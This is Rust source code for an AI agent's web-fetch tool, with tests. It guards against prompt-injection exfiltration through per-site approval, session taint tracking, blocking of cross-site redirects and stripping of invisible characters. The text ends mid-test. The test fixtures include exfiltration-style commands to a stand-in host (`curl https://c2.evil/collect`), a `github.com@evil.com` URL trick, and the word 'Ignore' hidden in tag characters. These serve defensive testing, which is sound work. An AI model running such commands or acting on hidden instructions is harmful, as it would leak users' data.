//! `web_fetch`: read a web page, or a GitHub repository, from a link.
//!
//! Ports Marv's `src/tools/web-fetch.ts`. The fetching, address checks and conversion are [`crate::web`].
//!
//! - Marv fetches it itself, not the sandbox (which has no network), so it can enforce what `curl` can't: plain GETs,
//!   public addresses only, a size and time limit, text only, redirects checked one by one.
//! - Output in parts of [`PAGE_CHARS`] = 30k characters (`offset`); the header says what to pass for the next.
//! - Reading on (`offset > 0`) uses a cache of [`CACHE_PAGES`] = 8 pages (each at most [`CACHE_MAX_CHARS`] = 1M chars)
//!   for [`CACHE_MS`] = 10 min, keyed by the requested URL and the final one after same-site redirects. A cached read
//!   sends nothing, so it doesn't ask; `needs_approval` hands the page it found to `run`, so an expiry in between can't
//!   fetch unasked.
//! - Approval: asked per site, scope `web:<domain>` (no `www.`; GitHub's hosts count as `github.com`); no `auto_safe`,
//!   so yolo never skips it (the URL itself can carry data out: `?k=<a secret>`); `uses_network`, so worktree
//!   subagents ask too. Sites the user pasted (outside code) are pre-approved (`pasted_scopes`).
//! - A redirect to another site isn't followed: the model gets the target and calls again, which asks, so an open
//!   redirect on an approved site can't carry the query string elsewhere.
//! - marv-rs: `kind` Egress and `provenance` Web: the result taints the session, and after taint every new URL
//!   prefix asks even if the site was approved with "always" (docs/SECURITY.md). "Always" on a tainted call approves
//!   its [`url_prefix`] (the S6 item: a prefix, not the whole domain); `run_tool` checks it through `egress_url`.
//! - marv-rs: what web_fetch returns has its invisible characters stripped ([`crate::web::hidden::strip_invisible`]:
//!   zero-width and tag characters can spell instructions no reviewer sees).

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{Value, json};

use crate::types::{Preview, Scope, Tool, ToolContext, ToolError, ToolOutput};
use crate::web::address::{CheckOptions, check_address};
use crate::web::convert::{ConvertOptions, Converter};
use crate::web::fetch::{GetOptions, Page, fetch_page, parse_url};
use crate::web::github::{GithubOptions, fetch_github, parse_github};
use crate::web::hidden::strip_invisible;

pub const PAGE_CHARS: usize = 30_000;
pub const CACHE_PAGES: usize = 8;
pub const CACHE_MS: u64 = 10 * 60_000;
pub const CACHE_MAX_CHARS: usize = 1_000_000;
/// GitHub's other hosts count as github.com: one "don't ask again" covers them all.
pub const GITHUB_HOSTS: &[&str] =
    &["api.github.com", "raw.githubusercontent.com", "gist.github.com", "gist.githubusercontent.com"];

/// The site an approval covers: the host, lowercased, without `www.` or a trailing dot. Ports and http/https share a
/// domain's scope, like Claude Code's per-domain rule.
pub fn domain_of(url: &str) -> String {
    let Ok(parsed) = parse_url(url) else { return url.to_string() };
    let Some(host) = parsed.host_str() else { return url.to_string() };
    let host = host.trim_end_matches('.');
    let host = host.strip_prefix("www.").unwrap_or(host);
    if GITHUB_HOSTS.contains(&host) { "github.com".into() } else { host.to_string() }
}

pub fn web_scope(url: &str) -> String {
    format!("web:{}", domain_of(url))
}

/// The URL as a tainted session's approvals see it: no query or fragment, the path ending in `/` (so
/// `https://docs.rs/regex` is under the prefix `https://docs.rs/regex/` and `https://docs.rs/regexp` isn't).
pub fn egress_key(url: &str) -> Option<String> {
    let parsed = parse_url(url).ok()?;
    if parsed.scheme() != "http" && parsed.scheme() != "https" {
        return None;
    }
    let path = parsed.path();
    let slash = if path.ends_with('/') { "" } else { "/" };
    Some(format!("{}{path}{slash}", parsed.origin().ascii_serialization()))
}

/// The prefix "always" covers once the session is tainted: the origin and the first path segment
/// (`https://docs.rs/regex/` for `https://docs.rs/regex/latest/regex/`), not the whole domain (marv-rs S6). A link to
/// the site's root covers that origin.
pub fn url_prefix(url: &str) -> Option<String> {
    let key = egress_key(url)?;
    let parsed = url::Url::parse(&key).ok()?;
    let origin = parsed.origin().ascii_serialization();
    match parsed.path_segments().and_then(|mut s| s.next()).filter(|s| !s.is_empty()) {
        Some(first) => Some(format!("{origin}/{first}/")),
        None => Some(format!("{origin}/")),
    }
}

/// The scopes of the links in what the user typed (outside fenced blocks and inline code: a pasted script's hosts
/// are what an injected instruction would send data to).
pub fn pasted_scopes(text: &str) -> Vec<String> {
    // Code isn't a link the user means to visit (a pasted script or log may name any host): drop fenced blocks
    // (closed or not, ``` and ~~~) and inline code spans before looking.
    let prose = strip_inline_code(&strip_closed_runs(&strip_fences(text)));
    static LINK: std::sync::LazyLock<regex::Regex> =
        std::sync::LazyLock::new(|| regex::Regex::new(r#"(?i)https?://[^\s<>"'`\[\]]+"#).unwrap());
    let mut scopes: Vec<String> = Vec::new();
    for link in LINK.find_iter(&prose) {
        let link = link.as_str().trim_end_matches(['.', ',', ';', ':', '!', '?', ')', ']']);
        let scope = web_scope(link);
        if !scopes.contains(&scope) {
            scopes.push(scope);
        }
    }
    scopes
}

/// The byte offsets where lines start, from `from` on.
fn line_starts(text: &str, from: usize) -> impl Iterator<Item = usize> + '_ {
    (from..text.len()).filter(move |&i| i == 0 || text.as_bytes()[i - 1] == b'\n')
}

/// A fence line's character and run length: `[ \t]*` then 3+ backticks or tildes. `rest`: what follows the run.
fn fence_run(line: &str) -> Option<(u8, usize, &str)> {
    let body = line.trim_start_matches([' ', '\t']);
    let c = *body.as_bytes().first().filter(|c| **c == b'`' || **c == b'~')?;
    let n = body.bytes().take_while(|b| *b == c).count();
    (n >= 3).then(|| (c, n, &body[n..]))
}

/// Marv's first pass (a regex with backreferences, which Rust's `regex` lacks, written out): fences follow CommonMark.
/// A block opens on a line starting with 3+ backticks or tildes (followed by a newline) and closes on a line of at
/// least as many of the same character with nothing after but spaces; an unclosed one runs to the end.
fn strip_fences(text: &str) -> String {
    let (mut out, mut copied, mut from) = (String::new(), 0, 0);
    while let Some((start, c, n, content)) = line_starts(text, from).find_map(|start| {
        let nl = start + text[start..].find('\n')?;
        let (c, n, _) = fence_run(&text[start..nl])?;
        Some((start, c, n, nl + 1))
    }) {
        let end = line_starts(text, content)
            .find_map(|q| {
                let line_end = text[q..].find('\n').map_or(text.len(), |i| q + i);
                let (cc, nn, rest) = fence_run(&text[q..line_end])?;
                (cc == c && nn >= n && rest.trim_matches([' ', '\t']).is_empty()).then_some(line_end)
            })
            .unwrap_or(text.len());
        out.push_str(&text[copied..start]);
        (copied, from) = (end, end);
    }
    out.push_str(&text[copied..]);
    out
}

/// Marv's second pass: ```…``` or ~~~…~~~ within a line or across lines (a run with no closing one is kept).
fn strip_closed_runs(text: &str) -> String {
    let (mut out, mut copied, mut i) = (String::new(), 0, 0);
    while i + 3 <= text.len() {
        let run = &text.as_bytes()[i..i + 3];
        if run == b"```" || run == b"~~~" {
            let marker = &text[i..i + 3];
            if let Some(close) = text[i + 3..].find(marker) {
                let end = i + 3 + close + 3;
                out.push_str(&text[copied..i]);
                (copied, i) = (end, end);
                continue;
            }
        }
        i += 1;
    }
    out.push_str(&text[copied..]);
    out
}

/// Marv's third pass: a closed inline code span on one line.
fn strip_inline_code(text: &str) -> String {
    static CODE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| regex::Regex::new(r"`[^`\n]*`").unwrap());
    CODE.replace_all(text, "").into_owned()
}

fn chars(n: usize) -> String {
    if n < 1000 { format!("{n} chars") } else { format!("{:.1}k chars", n as f64 / 1000.0) }
}

/// The part of a page the model reads now, under a header saying what it is and how to read on.
pub fn paged(page: &Page, offset: usize, size: usize) -> Result<ToolOutput, ToolError> {
    let total = page.text.chars().count();
    if offset > 0 && offset >= total {
        return Err(ToolError(format!("offset {offset} is past the end ({total} characters).")));
    }
    let end = total.min(offset + size);
    let partial = offset > 0 || end < total;
    let range = if partial {
        let next = if end < total { format!(" (offset: {end} for the next part)") } else { String::new() };
        format!(" · characters {offset}-{end} of {total}{next}")
    } else {
        String::new()
    };
    let header = match &page.title {
        Some(title) if !title.is_empty() => format!("Fetched {} · {title}{range}", page.url),
        _ => format!("Fetched {}{range}", page.url),
    };
    let note = page.note.as_ref().map(|n| format!("\n({n})")).unwrap_or_default();
    let body: String = page.text.chars().skip(offset).take(end - offset).collect();
    let body = if body.is_empty() { "(empty page)".to_string() } else { body };
    let summary =
        if partial { format!("{} of {}", chars(end - offset).replace(" chars", ""), chars(total)) } else { chars(total) };
    Ok(ToolOutput::ok(format!("{header}{note}\n\n{body}"), summary))
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WebFetchInput {
    pub url: String,
    pub offset: Option<usize>,
}

/// Test-only network settings (Marv's `WebOptions`): let a local server through, send headers over http.
#[derive(Debug, Clone, Default)]
pub struct WebOptions {
    pub allow_private: bool,
    pub allow_http: bool,
    pub api_base: Option<String>,
    pub raw_base: Option<String>,
    /// Default: GITHUB_TOKEN, else GH_TOKEN, from the real environment. Sent to GitHub's API host only. `Some("")`:
    /// none.
    pub token: Option<String>,
    /// Tests only: the page converter (default: this binary's `__html-convert`).
    pub converter: Option<Converter>,
}

struct Cached {
    page: Page,
    at: Instant,
    keys: Vec<String>,
}

/// The pages kept for reading on, oldest first.
#[derive(Default)]
pub struct PageCache {
    entries: Mutex<Vec<Cached>>,
}

impl PageCache {
    /// A fresh page fetched (or redirected to) at `url`.
    pub fn get(&self, url: &str) -> Option<Page> {
        let key = parse_url(url).ok()?.to_string();
        let entries = self.entries.lock().unwrap_or_else(|e| e.into_inner());
        entries.iter().find(|c| c.keys.contains(&key) && c.at.elapsed() < Duration::from_millis(CACHE_MS)).map(|c| c.page.clone())
    }

    /// Keeps a page under every key (one entry, counted once toward the limit).
    pub fn remember(&self, keys: &[String], page: Page) {
        if page.text.chars().count() > CACHE_MAX_CHARS {
            return;
        }
        let mut entries = self.entries.lock().unwrap_or_else(|e| e.into_inner());
        entries.retain(|c| !c.keys.iter().any(|k| keys.contains(k)));
        let mut unique = Vec::new();
        for key in keys {
            if !unique.contains(key) {
                unique.push(key.clone());
            }
        }
        entries.push(Cached { page, at: Instant::now(), keys: unique });
        while entries.len() > CACHE_PAGES {
            entries.remove(0);
        }
    }
}

#[derive(Default)]
pub struct WebFetch {
    pub options: WebOptions,
    pub cache: PageCache,
    /// What `needs_approval` found for a call (by URL), for `run` (Marv: a WeakMap on the parsed input).
    approved_reads: Mutex<HashMap<String, Page>>,
}

impl WebFetch {
    /// The tool with its network settings (tests point it at a local server).
    pub fn new(options: WebOptions) -> Self {
        Self { options, ..Self::default() }
    }

    fn get_options(&self, first: &url::Url) -> GetOptions {
        // A redirect to another site isn't followed: the URL (and its query) could carry data to a site the user
        // never approved. The model gets the target and calls again, which asks if that site is new.
        let site = domain_of(first.as_str());
        GetOptions {
            allow_private: self.options.allow_private,
            allow_http: self.options.allow_http,
            follow_redirect: Some(std::sync::Arc::new(move |_from: &url::Url, to: &url::Url| domain_of(to.as_str()) == site)),
            convert: ConvertOptions { converter: self.options.converter.clone(), ..ConvertOptions::default() },
            ..GetOptions::default()
        }
    }

    fn token(&self) -> Option<String> {
        self.options
            .token
            .clone()
            .or_else(|| ["GITHUB_TOKEN", "GH_TOKEN"].iter().find_map(|k| std::env::var(k).ok().filter(|t| !t.is_empty())))
    }
}

/// The page as the model reads it, tagged as web content (it taints the session).
fn web_result(page: &Page, offset: usize) -> Result<ToolOutput, ToolError> {
    let mut result = paged(page, offset, PAGE_CHARS)?;
    result.provenance = marv_core::Provenance::Web;
    Ok(result)
}

#[async_trait]
impl Tool for WebFetch {
    type Input = WebFetchInput;

    fn name(&self) -> &str {
        "web_fetch"
    }
    fn description(&self) -> &str {
        "Fetch a web page and read it as Markdown (plain text and JSON as they are). A GitHub repository link (github.com/owner/repo) gives its description, README and file list; read one of its files with github.com/owner/repo/blob/<branch>/<path>, list a folder with github.com/owner/repo/tree/<branch>/<folder>. Long results come in parts of 30,000 characters: pass the offset the result names to read the next. Public sites only, not localhost or the local network. The user may be asked to approve each new site."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The address, e.g. https://example.com/page or github.com/owner/repo."},
                // zod's `.int()` bounds it at Number.MAX_SAFE_INTEGER; Marv's spec says so, and the bytes must match.
                "offset": {"type": "integer", "minimum": 0, "maximum": 9_007_199_254_740_991_u64, "description": "Where to start, in characters, for the next part of a long result (the result says what to pass). Default 0."}
            },
            "required": ["url"],
            "additionalProperties": false
        })
    }
    fn kind(&self) -> marv_core::ToolKind {
        marv_core::ToolKind::Egress
    }
    fn provenance(&self) -> marv_core::Provenance {
        marv_core::Provenance::Web
    }
    fn label(&self, input: &WebFetchInput) -> String {
        input.url.trim_start_matches("https://").trim_start_matches("http://").to_string()
    }
    /// A read from the cache sends nothing out, so it doesn't ask.
    fn needs_approval(&self, input: &WebFetchInput) -> Option<bool> {
        if input.offset.unwrap_or(0) == 0 {
            return Some(true);
        }
        match self.cache.get(&input.url) {
            Some(page) => {
                self.approved_reads.lock().unwrap_or_else(|e| e.into_inner()).insert(input.url.clone(), page);
                Some(false)
            }
            None => Some(true),
        }
    }
    fn uses_network(&self, _input: &WebFetchInput) -> bool {
        true
    }
    fn scope(&self, input: &WebFetchInput) -> Option<Scope> {
        Some(Scope { key: web_scope(&input.url), description: format!("fetching from {}", domain_of(&input.url)) })
    }

    fn egress_url(&self, input: &WebFetchInput) -> Option<String> {
        egress_key(&input.url)
    }

    async fn preview(&self, input: &WebFetchInput, ctx: &ToolContext) -> Result<Preview, ToolError> {
        let parsed = parse_url(&input.url)?;
        // A private address fails here, so nobody is asked to approve it.
        let check = CheckOptions { allow_private: self.options.allow_private, ..CheckOptions::default() };
        check_address(&parsed, &check, &ctx.cancel).await?;
        Ok(Preview {
            title: "Fetch a web page".into(),
            text: Some(parsed.to_string()),
            note: Some("GET · fetched by Marv, not in the sandbox".into()),
            ..Preview::default()
        })
    }

    async fn run(&self, input: &WebFetchInput, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        let offset = input.offset.unwrap_or(0);
        let parsed = parse_url(&input.url)?;
        // Reading on (offset > 0) reuses the page fetched a moment ago instead of downloading and converting it again;
        // offset 0 always fetches fresh. What needs_approval found wins: an entry expiring between the two mustn't
        // turn a read nobody was asked about into a download.
        let approved = self.approved_reads.lock().unwrap_or_else(|e| e.into_inner()).remove(&input.url);
        let cached = approved.or_else(|| if offset > 0 { self.cache.get(&input.url) } else { None });
        if let Some(page) = cached {
            return web_result(&page, offset);
        }
        let get = self.get_options(&parsed);
        let mut page = match parse_github(&parsed) {
            Some(link) => {
                let options = GithubOptions {
                    get,
                    token: self.token(),
                    api_base: self.options.api_base.clone(),
                    raw_base: self.options.raw_base.clone(),
                    max_bytes: None,
                };
                fetch_github(&link, &options, &ctx.cancel).await?
            }
            None => match fetch_page(parsed.as_str(), &get, &ctx.cancel).await {
                Ok(page) => page,
                Err(err) => {
                    // "example.com" got https from parse_url; a site that only serves http fails to connect, and the
                    // model can't tell why.
                    static SCHEME: std::sync::LazyLock<regex::Regex> =
                        std::sync::LazyLock::new(|| regex::Regex::new(r"(?i)^[a-z][a-z0-9+.-]*://").unwrap());
                    if !SCHEME.is_match(input.url.trim()) && err.0.starts_with("Couldn't fetch ") {
                        return Err(ToolError(format!("{} If the site only serves http, pass an http:// URL.", err.0)));
                    }
                    return Err(err);
                }
            },
        };
        page.text = strip_invisible(&page.text);
        page.title = page.title.map(|t| strip_invisible(&t));
        if page.text.chars().count() <= CACHE_MAX_CHARS {
            let fin = url::Url::parse(&page.url).map(|u| u.to_string()).unwrap_or_else(|_| page.url.clone());
            self.cache.remember(&[parsed.to_string(), fin], page.clone());
        }
        web_result(&page, offset)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn page(text: &str) -> Page {
        Page { url: "https://e.com/".into(), title: Some("T".into()), text: text.into(), note: None }
    }

    #[test]
    fn domain_of_is_the_site_an_approval_covers() {
        assert_eq!(domain_of("https://www.Example.com/a?b=c"), "example.com");
        assert_eq!(domain_of("example.com/a"), "example.com");
        assert_eq!(domain_of("https://raw.githubusercontent.com/a/b/main/x"), "github.com");
        assert_eq!(domain_of("https://api.github.com/repos/a/b"), "github.com");
        assert_eq!(domain_of("https://docs.github.com/en"), "docs.github.com");
        assert_eq!(domain_of("https://github.com@evil.com/"), "evil.com");
    }

    #[test]
    fn links_inside_pasted_code_arent_links_the_user_means_to_visit() {
        assert!(pasted_scopes("why does this phone home? ```curl https://c2.evil/x```").is_empty());
        assert_eq!(pasted_scopes("why?\n```sh\ncurl https://c2.evil/x\n```\nsee https://example.com/a"), ["web:example.com"]);
        assert!(pasted_scopes("~~~\ncurl https://c2.evil/x\n~~~").is_empty());
        assert!(pasted_scopes("unclosed:\n```\ncurl https://c2.evil/x").is_empty());
        assert_eq!(pasted_scopes("run `curl https://c2.evil/collect` and read https://example.com/b"), ["web:example.com"]);
    }

    #[test]
    fn a_fence_closes_only_on_a_line_of_at_least_as_many_fence_characters_and_nothing_else() {
        assert!(pasted_scopes("````md\n```sh\ncurl https://c2.evil/3\n```\n````").is_empty());
        assert!(pasted_scopes("```\n```js\nhttps://c2.evil/2\n```").is_empty());
        assert_eq!(pasted_scopes("```\ncode\n```\nsee https://example.com/a"), ["web:example.com"]);
    }

    #[test]
    fn a_stray_fence_in_prose_doesnt_hide_the_links_after_it() {
        assert_eq!(pasted_scopes("The diff ~~~ is roughly 5; see https://docs.real.com"), ["web:docs.real.com"]);
        assert_eq!(pasted_scopes("a ``` b; see https://docs.real.com"), ["web:docs.real.com"]);
    }

    #[test]
    fn a_markdown_link_gives_both_of_its_addresses() {
        assert_eq!(pasted_scopes("[https://a.com](https://b.com)"), ["web:a.com", "web:b.com"]);
    }

    #[test]
    fn links_in_what_the_user_typed_with_trailing_punctuation_dropped() {
        assert_eq!(
            pasted_scopes("look at https://github.com/a/b and https://www.example.com/x."),
            ["web:github.com", "web:example.com"]
        );
        assert_eq!(pasted_scopes("(see https://example.com/y), then https://example.com/z"), ["web:example.com"]);
        assert!(pasted_scopes("github.com/a/b without a scheme isn't a pasted link").is_empty());
    }

    #[test]
    fn a_short_page_whole_and_a_long_one_in_parts() {
        let short = paged(&page("hello"), 0, PAGE_CHARS).unwrap();
        assert_eq!((short.output.as_str(), short.summary.as_str()), ("Fetched https://e.com/ · T\n\nhello", "5 chars"));
        let long = page(&format!("{}{}{}", "a".repeat(30_000), "b".repeat(30_000), "c".repeat(10_000)));
        let first = paged(&long, 0, PAGE_CHARS).unwrap();
        assert!(
            first
                .output
                .starts_with("Fetched https://e.com/ · T · characters 0-30000 of 70000 (offset: 30000 for the next part)\n\naaa")
        );
        assert_eq!(first.summary, "30.0k of 70.0k chars");
        assert!(
            paged(&long, 60_000, PAGE_CHARS)
                .unwrap()
                .output
                .starts_with("Fetched https://e.com/ · T · characters 60000-70000 of 70000\n\nccc")
        );
        assert_eq!(paged(&long, 70_000, PAGE_CHARS).unwrap_err().0, "offset 70000 is past the end (70000 characters).");
        let empty = Page { url: "https://e.com/".into(), title: None, text: String::new(), note: Some("Whole page.".into()) };
        assert_eq!(paged(&empty, 0, PAGE_CHARS).unwrap().output, "Fetched https://e.com/\n(Whole page.)\n\n(empty page)");
    }

    #[test]
    fn the_cache_keeps_eight_pages_under_both_urls() {
        let cache = PageCache::default();
        cache.remember(&["https://a.com/".into(), "https://a.com/final".into()], page("x"));
        assert!(cache.get("a.com/final").is_some());
        for i in 0..CACHE_PAGES {
            cache.remember(&[format!("https://p{i}.com/")], page("y"));
        }
        assert!(cache.get("https://a.com/").is_none()); // the oldest went
        assert!(WebFetch::default().needs_approval(&WebFetchInput { url: "https://p1.com/".into(), offset: None }) == Some(true));
    }

    use crate::types::{ApprovalRequest, Approver, Decision};
    use crate::web::test_server::{Response, TestServer};
    use crate::{ToolRef, run_tool};
    use marv_core::{Provenance, ToolCall};
    use std::sync::Arc;
    use std::sync::Mutex as StdMutex;

    const PAGE: &str = "Words worth reading on this page. ";

    fn html_page() -> String {
        format!("<html><head><title>Post</title></head><body><article><p>{}</p></article></body></html>", PAGE.repeat(10))
    }

    struct Asked {
        decision: Decision,
        requests: StdMutex<Vec<ApprovalRequest>>,
    }

    impl Asked {
        fn new(decision: Decision) -> Arc<Self> {
            Arc::new(Self { decision, requests: StdMutex::new(Vec::new()) })
        }
        fn count(&self) -> usize {
            self.requests.lock().unwrap().len()
        }
    }

    #[async_trait]
    impl Approver for Asked {
        async fn approve(&self, request: ApprovalRequest) -> Decision {
            self.requests.lock().unwrap().push(request);
            self.decision
        }
    }

    fn local_tool() -> Arc<WebFetch> {
        Arc::new(WebFetch::new(WebOptions {
            allow_private: true,
            token: Some(String::new()),
            converter: Some(crate::web::convert::tests::test_converter()),
            ..WebOptions::default()
        }))
    }

    fn ctx(approver: &Arc<Asked>) -> ToolContext {
        ToolContext { approver: Some(approver.clone()), ..ToolContext::new(std::env::temp_dir()) }
    }

    fn call(url: &str, offset: Option<usize>) -> ToolCall {
        ToolCall { id: "w1".into(), name: "web_fetch".into(), arguments: json!({"url": url, "offset": offset}).to_string() }
    }

    async fn fetch(tool: &Arc<WebFetch>, url: &str, offset: Option<usize>, ctx: &ToolContext) -> crate::ToolOutcome {
        let tools: Vec<ToolRef> = vec![tool.clone()];
        run_tool(&call(url, offset), ctx, &tools).await
    }

    async fn long_server(text: &'static str) -> TestServer {
        TestServer::start(move |_| Response::text(text.repeat(70_000), "text/plain")).await
    }

    #[tokio::test]
    async fn asks_per_site_shows_the_full_url_and_returns_the_page_as_web_content() {
        let html = html_page();
        let s = TestServer::start(move |_| Response::text(html.clone(), "text/html")).await;
        let asked = Asked::new(Decision::Yes);
        let ctx = ctx(&asked);
        let out = fetch(&local_tool(), &format!("{}/post?q=1", s.base()), None, &ctx).await;
        let requests = asked.requests.lock().unwrap().clone();
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].scope, Scope { key: "web:localhost".into(), description: "fetching from localhost".into() });
        assert_eq!(requests[0].preview.text.as_deref(), Some(format!("{}/post?q=1", s.base()).as_str()));
        assert!(requests[0].network);
        assert_eq!(out.label, format!("localhost:{}/post?q=1", s.port));
        assert!(out.result.output.starts_with(&format!("Fetched {}/post?q=1 · Post\n\n", s.base())), "{}", out.result.output);
        assert!(out.result.output.contains("Words worth reading"));
        assert_eq!(out.result.provenance, Provenance::Web);
        assert!(ctx.taint.is_tainted(), "a web result taints the session");
    }

    #[tokio::test]
    async fn yolo_doesnt_skip_the_question() {
        let s = TestServer::start(|_| Response::text("hi", "text/plain")).await;
        let asked = Asked::new(Decision::Yes);
        let yolo = ToolContext { yolo: true, ..ctx(&asked) };
        fetch(&local_tool(), &format!("{}/", s.base()), None, &yolo).await;
        assert_eq!(asked.count(), 1);
    }

    #[tokio::test]
    async fn reading_on_with_offset_reuses_the_page_instead_of_fetching_it_again() {
        let s = long_server("x").await;
        let tool = local_tool();
        let asked = Asked::new(Decision::Yes);
        let url = format!("{}/long.txt", s.base());
        fetch(&tool, &url, None, &ctx(&asked)).await;
        let next = fetch(&tool, &url, Some(30_000), &ctx(&asked)).await;
        assert!(next.result.output.contains("characters 30000-60000 of 70000"));
        assert_eq!(s.requests(), 1);
        fetch(&tool, &url, None, &ctx(&asked)).await; // offset 0: fresh
        assert_eq!(s.requests(), 2);
    }

    #[tokio::test]
    async fn a_private_address_fails_before_anyone_is_asked() {
        let asked = Asked::new(Decision::Yes);
        let out = fetch(&Arc::new(WebFetch::default()), "http://127.0.0.1:9222/json", None, &ctx(&asked)).await;
        assert!(out.result.is_error);
        assert!(out.result.output.contains("Refused: 127.0.0.1 is a private address"), "{}", out.result.output);
        assert_eq!(asked.count(), 0);
    }

    #[tokio::test]
    async fn a_cached_read_doesnt_ask_again_an_uncached_offset_does() {
        let s = long_server("x").await;
        let tool = local_tool();
        let asked = Asked::new(Decision::Yes);
        let url = format!("{}/long.txt", s.base());
        let uncached = fetch(&tool, &url, Some(30_000), &ctx(&asked)).await;
        assert_eq!(asked.count(), 1); // nothing cached yet: this fetches, so it asks
        assert!(uncached.result.output.contains("characters 30000-60000 of 70000"));
        fetch(&tool, &url, None, &ctx(&asked)).await;
        assert_eq!(asked.count(), 2);
        fetch(&tool, &url, Some(30_000), &ctx(&asked)).await;
        assert_eq!(asked.count(), 2); // from the cache
    }

    #[tokio::test]
    async fn only_the_8_most_recent_pages_are_kept() {
        let s = TestServer::start(|req| Response::text(format!("{:.<100}", format!("page {}", req.path)), "text/plain")).await;
        let tool = local_tool();
        let asked = Asked::new(Decision::Yes);
        for i in 0..9 {
            fetch(&tool, &format!("{}/p{i}", s.base()), None, &ctx(&asked)).await;
        }
        assert_eq!(s.requests(), 9);
        fetch(&tool, &format!("{}/p8", s.base()), Some(10), &ctx(&asked)).await;
        assert_eq!(s.requests(), 9); // newest: cached
        fetch(&tool, &format!("{}/p0", s.base()), Some(10), &ctx(&asked)).await;
        assert_eq!(s.requests(), 10); // oldest: evicted, fetched again
    }

    #[tokio::test]
    async fn a_redirect_to_another_site_isnt_followed_the_model_gets_the_target() {
        let other = TestServer::start(|_| Response::text("other", "text/plain")).await;
        let other_port = other.port;
        let here =
            TestServer::start(move |req| Response::redirect(&format!("http://127.0.0.1:{other_port}/c{}", req.search), 302))
                .await;
        let asked = Asked::new(Decision::Yes);
        let out = fetch(&local_tool(), &format!("{}/r?secret=x", here.base()), None, &ctx(&asked)).await;
        assert_eq!(other.requests(), 0);
        assert!(!out.result.is_error);
        assert!(
            out.result.output.contains(&format!(
                "redirects to http://127.0.0.1:{other_port}/c?secret=x, on another site: call web_fetch with that URL"
            )),
            "{}",
            out.result.output
        );
    }

    #[tokio::test]
    async fn a_redirect_within_the_same_site_is_followed_and_its_final_url_hits_the_cache() {
        let port = Arc::new(std::sync::OnceLock::<u16>::new());
        let p = port.clone();
        let s = TestServer::start(move |req| {
            if req.path == "/a" {
                Response::redirect(&format!("http://localhost:{}/b", p.get().unwrap()), 301)
            } else {
                Response::text("y".repeat(70_000), "text/plain")
            }
        })
        .await;
        port.set(s.port).unwrap();
        let tool = local_tool();
        let asked = Asked::new(Decision::Yes);
        let first = fetch(&tool, &format!("{}/a", s.base()), None, &ctx(&asked)).await;
        assert!(first.result.output.starts_with(&format!("Fetched {}/b", s.base())), "{}", &first.result.output[..80]);
        let next = fetch(&tool, &format!("{}/b", s.base()), Some(30_000), &ctx(&asked)).await;
        assert!(next.result.output.contains("characters 30000-60000 of 70000"));
        assert_eq!(asked.count(), 1);
        assert_eq!(s.requests(), 2); // /a and its redirect target /b, once
    }

    #[tokio::test]
    async fn a_github_link_goes_through_the_api_with_the_tools_token() {
        let seen = Arc::new(StdMutex::new(Vec::new()));
        let log = seen.clone();
        let api = TestServer::start(move |req| {
            log.lock().unwrap().push(req.header("authorization"));
            if req.path.ends_with("/contents/a.txt") {
                Response::text("file body", "text/plain")
            } else {
                Response::new(404, "{}").header("content-type", "application/json")
            }
        })
        .await;
        let tool = Arc::new(WebFetch::new(WebOptions {
            allow_private: true,
            allow_http: true,
            api_base: Some(api.base()),
            raw_base: Some(format!("{}/raw", api.base())),
            token: Some("from-option".into()),
            converter: None,
        }));
        let asked = Asked::new(Decision::Yes);
        let out = fetch(&tool, "github.com/o/r/blob/main/a.txt", None, &ctx(&asked)).await;
        assert!(out.result.output.contains("file body"), "{}", out.result.output);
        assert_eq!(*seen.lock().unwrap(), [Some("Bearer from-option".to_string())]);
    }

    #[tokio::test]
    async fn a_page_that_leaves_the_cache_between_the_question_and_the_read_is_read_from_what_was_approved() {
        let s = long_server("z").await;
        let tool = local_tool();
        let asked = Asked::new(Decision::Yes);
        let url = format!("{}/z", s.base());
        fetch(&tool, &url, None, &ctx(&asked)).await;
        let input = WebFetchInput { url: url.clone(), offset: Some(30_000) };
        assert_eq!(tool.needs_approval(&input), Some(false));
        for i in 0..CACHE_PAGES {
            tool.cache.remember(&[format!("https://p{i}.example/")], page("other")); // the entry is evicted now
        }
        drop(s); // and a fetch would fail: the read must use what was approved
        let out = tool.run(&input, &ToolContext::new(std::env::temp_dir())).await.unwrap();
        assert!(out.output.contains("characters 30000-60000 of 70000"));
    }

    #[tokio::test]
    async fn a_403_says_the_site_may_block_automated_readers() {
        let s = TestServer::start(|_| Response::new(403, "no")).await;
        let asked = Asked::new(Decision::Yes);
        let out = fetch(&local_tool(), &format!("{}/", s.base()), None, &ctx(&asked)).await;
        assert!(out.result.is_error);
        assert!(out.result.output.contains("403"));
        assert!(
            out.result
                .output
                .contains("The site may block automated readers: ask the user to paste the content, or try another source.")
        );
    }

    #[tokio::test]
    async fn a_failed_connection_to_an_address_typed_without_a_scheme_suggests_http() {
        let s = TestServer::start(|_| Response::text("hi", "text/plain")).await; // plain http: https to it fails
        let asked = Asked::new(Decision::Yes);
        let bare = fetch(&local_tool(), &format!("localhost:{}/", s.port), None, &ctx(&asked)).await;
        assert!(bare.result.is_error);
        assert!(bare.result.output.contains("If the site only serves http, pass an http:// URL."), "{}", bare.result.output);
        let explicit = fetch(&local_tool(), &format!("https://localhost:{}/", s.port), None, &ctx(&asked)).await;
        assert!(explicit.result.is_error);
        assert!(!explicit.result.output.contains("only serves http"));
    }

    // ---- marv-rs ---------------------------------------------------------------------------------------------

    #[tokio::test]
    async fn invisible_characters_never_reach_the_model() {
        let s = TestServer::start(|_| {
            Response::text(
                "Read\u{200B}me\u{E0049}\u{E0067}\u{E006E}\u{E006F}\u{E0072}\u{E0065} please\u{2060}",
                "text/plain; charset=utf-8",
            )
        })
        .await;
        let asked = Asked::new(Decision::Yes);
        let out = fetch(&local_tool(), &format!("{}/t.txt", s.base()), None, &ctx(&asked)).await;
        assert!(out.result.output.ends_with("Readme please"), "{:?}", out.result.output);
    }

    #[test]
    fn a_url_prefix_is_the_origin_and_first_segment_not_the_domain() {
        assert_eq!(url_prefix("https://docs.rs/regex/latest/regex/?x=1").as_deref(), Some("https://docs.rs/regex/"));
